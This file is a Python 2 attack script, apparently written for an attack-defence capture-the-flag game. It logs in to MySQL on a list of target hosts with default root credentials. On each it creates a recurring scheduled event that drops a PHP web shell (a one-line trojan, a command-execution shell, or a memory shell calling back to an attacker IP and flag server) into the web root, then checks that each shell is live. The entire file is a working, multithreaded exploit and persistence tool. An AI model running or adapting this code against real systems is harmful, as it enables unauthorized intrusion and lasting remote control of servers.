# -*- coding:utf-8 -*-

import MySQLdb
import threading
import requests
from random import Random
import ConfigParser
import logging.handlers

LOG_FILE1 = 'one.log'
LOG_FILE2 = 'rce.log'

handler1 = logging.handlers.RotatingFileHandler(LOG_FILE1, maxBytes = 1024*1024, backupCount = 5) # 实例化handler
handler2 = logging.handlers.RotatingFileHandler(LOG_FILE2, maxBytes = 1024*1024, backupCount = 5) # 实例化handler
#fmt = '%(asctime)s - %(filename)s:%(lineno)s - %(name)s - %(message)s'
fmt='%(message)s'
formatter = logging.Formatter(fmt)   # 实例化formatter
handler1.setFormatter(formatter)      # 为handler添加formatter

handler2.setFormatter(formatter)      # 为handler添加formatter
logger1 = logging.getLogger('one')    # 获取名为tst的logger
logger1.addHandler(handler1)           # 为logger添加handler
logger1.setLevel(logging.DEBUG)

logger2=logging.getLogger('rce')
logger2.addHandler(handler2)           # 为logger添加handler
logger2.setLevel(logging.DEBUG)

cf = ConfigParser.ConfigParser()
cf.read("config.ini")
payload_t = cf.get('baseconf', "payload")
attack_ip = cf.get("baseconf", "attack_ip")
flag_url = cf.get("baseconf", "flag_url")
password_t = cf.get("baseconf", "password")
url_1=""


def attack(ip,shell_txt):
    try:
        # 打开数据库连接
        db = MySQLdb.connect(ip,"root","123456","mysql",connect_timeout=2 )
        cursor = db.cursor()
        #php_url=random_str();
        print shell_txt
        cursor.execute("set global event_scheduler =1; ")
        sb=""
        if (payload_t == "one.php"):
            sb="search"
        elif (payload_t == "rce.php"):
            sb="comment"
        elif(payload_t=="mem.php"):
            sb="members"
        sql="""
        CREATE EVENT mysql_session_{1}
        ON SCHEDULE EVERY 30 SECOND
        DO select '{0}' into outfile '/var/www/8011/{2}.php';
        """.format(shell_txt,random_str(),sb)
        cursor.execute(sql)
        data = cursor.fetchone()
        db.close()
        url_1="http://"+ip+":8011/{0}.php".format(sb)
        print url_1
        #print shell_txt
        if(payload_t=="one.php"):
            logger1.info(url_1+"?"+password_t+"=")
        elif (payload_t == "rce.php"):
            logger2.info(url_1 + "?cmd=")
        if requests.codes.ok== checkPayload(url_1):
            print url_1,"shell上传成功"
        else:
            print url_1, "shell上传失败"
    except Exception,e:
        print str(e)
        #pass
    finally:
        print ""
def random_str(randomlength=8):
    str = ''
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    length = len(chars) - 1
    random = Random()
    for i in range(randomlength):
        str+=chars[random.randint(0, length)]
    return str

#加载txt文件

def load_config():
    with open(payload_t, 'rb+') as f:
        str = ""
        for line in f.readlines():
            str = str + " " + line.strip('\n\r')
        f.close()
    if payload_t == "mem.php":
        str=str.format(attack_ip=attack_ip,flag_url=flag_url)
    elif payload_t=="one.php":
        str=str.format(password=password_t)
    return str

def payload(url_file):
    url_info=[]
    with open(url_file, 'rb+') as f:
        for info in f.readlines():
            if not info.startswith('#') and info.strip():
                url_info.append(info.strip())
    return url_info;

def checkPayload(payloadUrl):
    return requests.get(payloadUrl,timeout=5).status_code

if __name__ == '__main__':
    #获取shell内容
    """
    one.php是一句话木马
    mem.php是内存马，需要修改flag服务器地址和反弹地址
    rce.php是命令执行木马 http://192.168.49.147:8011/rce.php?cmd=curl%20www.baidu.com
    """
    shell=load_config();
    ipList=payload("url.txt")
    threads = []
    #print shell
    for ip in ipList:
        #print ip
        t = threading.Thread(target=attack, args=(ip,shell))
        threads.append(t)
    for t in threads:
        t.start()
    #print "program exit"